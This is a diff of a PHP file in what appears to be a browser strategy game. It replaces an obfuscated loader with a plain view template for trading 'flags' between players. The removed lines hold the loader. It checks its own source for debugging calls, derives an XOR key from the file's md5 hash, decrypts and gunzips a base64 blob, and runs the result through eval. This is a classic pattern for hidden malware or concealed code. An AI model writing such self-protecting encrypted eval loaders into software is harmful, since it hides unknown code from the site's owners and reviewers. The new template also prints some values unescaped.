@@ -1,24 +1,149 @@
-<?php
-$htskluxsz="e5c770ef683bb14adda7ce9dccfceaca";
-$xtdkwtpo="5c030006020601050f0f55555a550456525d52035b575b5d5a55000004000250";
-$gibynavrc="Qey2qGRFh0Upt7nEE8wWBITe/WVDxYTh8OotxE4MPsNLpb9ZBVbvdTAi1pjGk213gFx0/OBDEJBe2GBHF7gEptx1+mGLdCADlJCva9jhLiZvr38lPr+oWWcH8788QJl8042qzCHTnUPsc1dh0X8XRoWo+x3rFn+bwo0vNb48GJCmcEDFsGSQwwlSjvjB+BkDLAwpv/cz96HrarzS7Ft52RzQMaSdUsLzTa2yZaMAU4qHKr/Yw/Q8Dqdhk7FB0s/oDR9blJl8NOZy3wdVgODuPb0cR1VCXjrXjRLrki/ioAL4APCdjVgNlNbimDTH1DgP4E85MqUSyyBvkq6ioOFZDWhn1eDSOblo9DNFkWF6Vx+VgG6OPBuU9qt10TizKKrrl9EFCKaWcxW36xAtD9hsuNTCiZwpiq8JEOaGGcj4E8MjV+6fWF1cZXR2YyruPeur0lpZy098xOZ5fxibJ9F0ItdjsQ62ARHpp4mywuuLogWXpk2BboiUQYVWoBWe4aQsBakZSfk3n3glGc/qQNaKxgB/mjyDBY5mhv5W0utX8Is0r1D4STgQB1/h862pnVoEolDAGgrktwUYJrJErAyUwdCMSkr002/dhPEkC7g/KnrnWpmsrnk5VoZ9L7DuCZYxk+IZ3jRh1pE2vzxFa9b67xgPNaeHX+mLAI6sDzJNnJJj4CiwmL3SJB2YFDW9skWHbPHH71XisuQP6zwPVshs+Enq+FAVPzYBHPejaFb1W3qQ0YBbRsoSfeXIBJHewm9p2oA47nst0bR27Yn5R7RLvhuF7vLm5oNIprlADz1zu67m6YLJgsCbtrBWXJIWoC9CvnGSX2R/8Xa4lohC4wCeqzQWe6juhaIVK2Nte2BFNVL8nv7HejMh70kCv5IYCtm604cZ5fYf6XoAkD1hwV3U/VpQP1CPZcGuiqSJmwkHy2GwxY/iYQHLgM0fJviqNvNerzyCAjsMSgdanwgQwe9hcFrzXzvfdXIXHjn5lDlPW4QoZeSkRY44Qb/lpR5LabNaHMG25ljb1Mjgifz82oRs/sQVKQDKHtNu/fkYEi66kNVDNh7KlMMD6VRB9WhfdAYbV9QYeDFn4yi3M0/Ts2LOPJk+gYDow3qog55CfWPPsvPeM/A1FyUqEgt71OajFKB432BW4hAq1/oG8pqjIwjf9eyXEg84jsuSfOQ9n9BR38f8qxpwtmolj6R+pJprLZiDkNmjTthLGNmAZSHa19rwa+rlxz6bGAaQbBj+KGG6UdfmQt6w4EMTdnMqahmUxYkF0+vEdOXc3KcxGZRSawdLHShtEjQwqg8zz+64AAvacCbeuGwf75phkzwb1XKmVdKi1iyIuYESJUa39+LTuw1e9oV20mLkkMMVdev88+WJ/1Md1vsljujtgn6RkXt0pJ+DTtecfmEmmHgoa3cRemXCCWsJczVK3n7z87YzvFBWYQ20b8+9zcamhAToOg2HyDSHHckiUyfCbV/kt5g02DWQTWaYQNBLDZRnlwgyyZ4Mz/Rmwv+fuY1m6yWteWKZujEIj0GuAu3IIaPdEYsQ0MoRkPar0nKIIRIQVeTW3F8/CbcaVrCOKVkq37QOm/PjWdg6tCFV6vO3k2V7C9BLhuXTnEHZQb3bDQqvZDThXySYEjN3dtBa3ybI4xmTP/ocJN68QMwSWmCdht7RQRgGIF/RmKM3WpZ43gYxUmBBbaNPYVHHW0exwPeziGr5QpREEccofI4nQA==";
-$mmtkxrhz=file_get_contents(__FILE__);
-$urzlikdhr=str_replace($gibynavrc,"",$mmtkxrhz);
-if(strpos($urzlikdhr,"ec"."ho")!==false||strpos($urzlikdhr,"pr"."int")!==false||strpos($urzlikdhr,"var_"."dump")!==false||strpos($urzlikdhr,"file_put_"."contents")!==false||strpos($urzlikdhr,"fw"."rite")!==false){die();}
-$felhrqo=str_replace(array($htskluxsz,$xtdkwtpo),array("SP_5cc87326","KP_8cd33573"),$mmtkxrhz);
-$gxxdxrkbea=md5($felhrqo);
-$oswzkezx=hex2bin($xtdkwtpo);
-$qlduvvin="";
-$nkrswx=strlen($gxxdxrkbea);
-for($ceaqklq=0;$ceaqklq<$nkrswx;$ceaqklq++){
-$qlduvvin.=chr(ord($oswzkezx[$ceaqklq])^ord($gxxdxrkbea[$ceaqklq]));
-}
-$rzljghgt=base64_decode($gibynavrc);
-$odgobpi=strlen($rzljghgt);
-$kcfvwaws="";
-$hzenrlri=strlen($qlduvvin);
-for($ceaqklq=0;$ceaqklq<$odgobpi;$ceaqklq++){
-$kcfvwaws.=$rzljghgt[$ceaqklq]^$qlduvvin[$ceaqklq%$hzenrlri];
-}
-$klyomhwg="gzun"."compress";
-eval('?>' . $klyomhwg($kcfvwaws) . '<?php ');
+<div class="flags-commerce-container">
+    <p><?= __('screens.flags.commerce_desc') ?></p>
+
+    <!-- Add Trade Offer -->
+    <h3><?= __('screens.flags.add_offer') ?></h3>
+    <form method="post" class="trade-form">
+        <input type="hidden" name="action" value="create_trade">
+
+        <table class="vis">
+            <tr>
+                <th><?= __('screens.flags.offer') ?></th>
+                <th><?= __('screens.flags.search_for') ?></th>
+            </tr>
+            <tr>
+                <td>
+                    <select name="offered_type" required>
+                        <option value=""><?= __('screens.flags.select_flag') ?></option>
+                        <?php foreach ($user_flags as $flag): ?>
+                            <option value="<?= $flag['flag_type'] ?>_<?= $flag['flag_level'] ?>">
+                                <?= \App\Models\FlagsModel::getFlagName($flag['flag_type']) ?>
+                                (<?= __('screens.common.level') ?>
+                                <?= $flag['flag_level'] ?>)
+                            </option>
+                        <?php endforeach; ?>
+                    </select>
+                </td>
+                <td>
+                    <select name="requested_type" required>
+                        <option value=""><?= __('screens.flags.select_flag') ?></option>
+                        <!-- All possible flags -->
+                        <?php
+                        $allTypes = ['resource_wood', 'resource_clay', 'resource_iron', 'recruitment', 'attack', 'defense', 'luck', 'population', 'coin_cost', 'cargo'];
+                        foreach ($allTypes as $type):
+                            for ($lvl = 1; $lvl <= 3; $lvl++):
+                                ?>
+                                <option value="<?= $type ?>_<?= $lvl ?>">
+                                    <?= \App\Models\FlagsModel::getFlagName($type) ?> (<?= __('screens.common.level') ?>
+                                    <?= $lvl ?>)
+                                </option>
+                                <?php
+                            endfor;
+                        endforeach;
+                        ?>
+                    </select>
+                </td>
+            </tr>
+            <tr>
+                <td colspan="2">
+                    <input type="text" name="to_username" placeholder="<?= __('screens.flags.player_name_placeholder') ?>" required>
+                    <input type="hidden" name="to_user_id" value="0">
+                    <button type="submit" class="btn"><?= __('screens.flags.create') ?></button>
+                </td>
+            </tr>
+        </table>
+    </form>
+
+    <!-- Tribe's Trade Offers -->
+    <h3><?= __('screens.flags.tribe_offers') ?></h3>
+    <?php if (empty($pending_trades)): ?>
+        <p><?= __('screens.flags.no_offers') ?></p>
+    <?php else: ?>
+        <table class="vis">
+            <tr>
+                <th><?= __('screens.flags.from') ?></th>
+                <th><?= __('screens.flags.to') ?></th>
+                <th><?= __('screens.flags.offer') ?></th>
+                <th><?= __('screens.flags.search_for') ?></th>
+                <th><?= __('screens.flags.action') ?></th>
+            </tr>
+            <?php foreach ($pending_trades as $trade): ?>
+                <tr>
+                    <td><?= htmlspecialchars($trade['from_username']) ?></td>
+                    <td><?= htmlspecialchars($trade['to_username']) ?></td>
+                    <td>
+                        <img src="/graphic/flags/small/<?= $trade['offered_flag_type'] ?>_<?= $trade['offered_flag_level'] ?>.png"
+                            alt="<?= \App\Models\FlagsModel::getFlagName($trade['offered_flag_type']) ?>"
+                            onerror="this.src='/graphic/flags/flag_disabled.png'">
+                        <?= \App\Models\FlagsModel::getFlagName($trade['offered_flag_type']) ?>
+                        (<?= $trade['offered_flag_level'] ?>)
+                    </td>
+                    <td>
+                        <img src="/graphic/flags/small/<?= $trade['requested_flag_type'] ?>_<?= $trade['requested_flag_level'] ?>.png"
+                            alt="<?= \App\Models\FlagsModel::getFlagName($trade['requested_flag_type']) ?>"
+                            onerror="this.src='/graphic/flags/flag_disabled.png'">
+                        <?= \App\Models\FlagsModel::getFlagName($trade['requested_flag_type']) ?>
+                        (<?= $trade['requested_flag_level'] ?>)
+                    </td>
+                    <td>
+                        <?php if ($trade['to_user_id'] == $user['id']): ?>
+                            <form method="post" style="display: inline;">
+                                <input type="hidden" name="action" value="accept_trade">
+                                <input type="hidden" name="trade_id" value="<?= $trade['id'] ?>">
+                                <button type="submit" class="btn"><?= __('screens.flags.accept') ?></button>
+                            </form>
+                            <form method="post" style="display: inline;">
+                                <input type="hidden" name="action" value="reject_trade">
+                                <input type="hidden" name="trade_id" value="<?= $trade['id'] ?>">
+                                <button type="submit" class="btn btn-cancel"><?= __('screens.flags.reject') ?></button>
+                            </form>
+                        <?php else: ?>
+                            <em><?= __('screens.flags.waiting') ?></em>
+                        <?php endif; ?>
+                    </td>
+                </tr>
+            <?php endforeach; ?>
+        </table>
+    <?php endif; ?>
+
+    <!-- Your Offers -->
+    <h3><?= __('screens.flags.my_offers') ?></h3>
+    <?php if (empty($my_offers)): ?>
+        <p><?= __('screens.flags.no_my_offers') ?></p>
+    <?php else: ?>
+        <table class="vis">
+            <tr>
+                <th><?= __('screens.flags.offer') ?></th>
+                <th><?= __('screens.flags.search_for') ?></th>
+                <th><?= __('screens.flags.to') ?></th>
+                <th><?= __('screens.flags.created_at') ?></th>
+                <th><?= __('screens.flags.action') ?></th>
+            </tr>
+            <?php foreach ($my_offers as $offer): ?>
+                <tr>
+                    <td>
+                        <img src="/graphic/flags/small/<?= $offer['offered_flag_type'] ?>_<?= $offer['offered_flag_level'] ?>.png"
+                            title="<?= \App\Models\FlagsModel::getFlagName($offer['offered_flag_type']) ?>">
+                        <?= \App\Models\FlagsModel::getFlagName($offer['offered_flag_type']) ?>
+                        (<?= $offer['offered_flag_level'] ?>)
+                    </td>
+                    <td>
+                        <img src="/graphic/flags/small/<?= $offer['requested_flag_type'] ?>_<?= $offer['requested_flag_level'] ?>.png"
+                            title="<?= \App\Models\FlagsModel::getFlagName($offer['requested_flag_type']) ?>">
+                        <?= \App\Models\FlagsModel::getFlagName($offer['requested_flag_type']) ?>
+                        (<?= $offer['requested_flag_level'] ?>)
+                    </td>
+                    <td><?= $offer['to_username'] ? htmlspecialchars($offer['to_username']) : __('screens.flags.tribe_all') ?></td>
+                    <td><?= date('d/m/Y H:i', $offer['created_at']) ?></td>
+                    <td>
+                        <form method="post" style="display: inline;">
+                            <input type="hidden" name="action" value="cancel_trade">
+                            <input type="hidden" name="trade_id" value="<?= $offer['id'] ?>">
+                            <button type="submit" class="btn btn-cancel"><?= __('screens.flags.cancel') ?></button>
+                        </form>
+                    </td>
+                </tr>
+            <?php endforeach; ?>
+        </table>
+    <?php endif; ?>
+</div>
